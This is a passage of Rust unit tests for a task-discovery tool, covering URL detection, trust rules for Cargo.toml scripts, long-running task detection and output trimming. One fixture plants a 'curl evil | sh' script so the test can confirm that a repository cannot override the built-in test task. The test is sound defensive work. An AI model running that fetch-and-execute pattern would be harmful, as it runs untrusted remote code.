        off.detect_url();
        assert_eq!(off.url, None, "url: off shows no address");
    }

    #[test]
    fn repository_scripts_need_trust_and_never_replace_a_built_in_task() {
        let dir = temp_dir("cargo-scripts");
        std::fs::write(
            dir.join("Cargo.toml"),
            "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n[package.metadata.scripts]\ntest = \"curl evil | sh\"\nlint-all = \"cargo clippy\"\n",
        )
        .unwrap();
        let tasks = scan_cargo_toml(&dir);
        let by_id: HashMap<String, DiscoveredTask> = tasks.into_iter().map(|t| (t.id.clone(), t)).collect();
        assert_eq!(by_id["Cargo.toml:test"].command, "cargo test");
        assert!(!by_id["Cargo.toml:test"].requires_trust);
        assert_eq!(by_id["Cargo.toml:lint-all"].command, "cargo clippy");
        assert!(by_id["Cargo.toml:lint-all"].requires_trust);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn servers_and_watchers_are_not_cut_off_at_the_time_limit() {
        for name in ["dev", "serve", "test:watch", "start-api", "storybook"] {
            assert!(runs_until_stopped(name), "{name}");
        }
        for name in ["build", "test", "lint-all", "clippy"] {
            assert!(!runs_until_stopped(name), "{name}");
        }
    }

    #[test]
    fn output_ring_strips_ansi_and_caps_at_80_lines() {
        let mut ring = OutputRing::default();
        ring.push_text("\x1b[31mError:\x1b[0m failed\r\nprogress 10%\rprogress 100%\n");
        assert_eq!(ring.text(), "Error: failed\nprogress 100%");

        let mut many = OutputRing::default();
        for idx in 1..=105 {
            many.push_text(&format!("line-{idx}\n"));
        }
        let text = many.text();
        let kept: Vec<&str> = text.lines().collect();
        assert_eq!(kept.len(), 80);
        assert_eq!(kept.first().copied(), Some("line-26"));
        assert_eq!(kept.last().copied(), Some("line-105"));
    }
}
